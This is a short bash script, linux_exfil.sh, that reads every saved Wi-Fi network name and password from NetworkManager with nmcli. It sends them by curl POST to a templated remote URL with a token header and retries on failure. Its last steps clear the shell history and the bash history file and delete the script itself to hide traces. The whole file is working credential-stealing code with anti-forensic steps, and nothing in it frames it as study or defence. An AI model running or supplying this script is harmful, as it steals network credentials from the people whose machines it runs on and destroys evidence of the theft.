#!/bin/bash
# linux_exfil.sh — Fixed to avoid duplicate SSID/PSK output
POST_URL="{{POST_URL}}"
TOKEN="{{TOKEN}}"

data=""
while IFS= read -r conn; do
    if [ -n "$conn" ]; then
        # Fetch SSID and PSK separately to prevent multiline confusion
        ssid=$(nmcli -s -g 802-11-wireless.ssid con show "$conn" 2>/dev/null)
        psk=$(nmcli -s -g 802-11-wireless-security.psk con show "$conn" 2>/dev/null)
        
        # Only include if both SSID and password exist
        if [ -n "$ssid" ] && [ -n "$psk" ]; then
            data+="SSID: $ssid"$'\n'"Password: $psk"$'\n\n'
        fi
    fi
done < <(nmcli -t -f NAME,TYPE con show 2>/dev/null | awk -F: '$2=="802-11-wireless" {print $1}')

# Exfiltrate if data found (with retry logic)
if [ -n "$data" ]; then
    for i in {1..3}; do
        if echo -e "$data" | curl -X POST \
            -H "X-Token: $TOKEN" \
            --data-binary @- \
            "$POST_URL" \
            -s -o /dev/null --max-time 10; then
            break
        fi
        sleep 2
    done
fi

# OPSEC: Clear shell history
history -c 2>/dev/null
[ -f ~/.bash_history ] && > ~/.bash_history 2>/dev/null

# Self-destruct: delete this script
rm -- "$0" 2>/dev/null